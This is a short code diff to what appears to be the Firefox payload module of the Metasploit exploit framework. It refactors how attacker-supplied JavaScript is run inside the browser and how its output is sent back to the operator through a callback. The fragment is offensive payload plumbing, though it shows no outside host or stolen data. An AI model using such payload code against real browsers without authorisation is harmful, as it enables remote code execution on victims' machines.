@@ -121,12 +121,14 @@ module Msf::Payload::Firefox
           var retVal = null;
 
           try {
-            retVal = Function('send', js[1])(function(r){
-              if (sent) return;
-              sent = true;
-              if (r) {
-                if (sync) setTimeout(function(){ cb(false, r+tag+"\\n"); });
-                else      cb(false, r+tag+"\\n");
+            retVal = Function(js[1]).call({
+              send: function(r){
+                if (sent) return;
+                sent = true;
+                if (r) {
+                  if (sync) setTimeout(function(){ cb(false, r+tag+"\\n"); });
+                  else      cb(false, r+tag+"\\n");
+                }
               }
             });
           } catch (e) { retVal = e.message; }
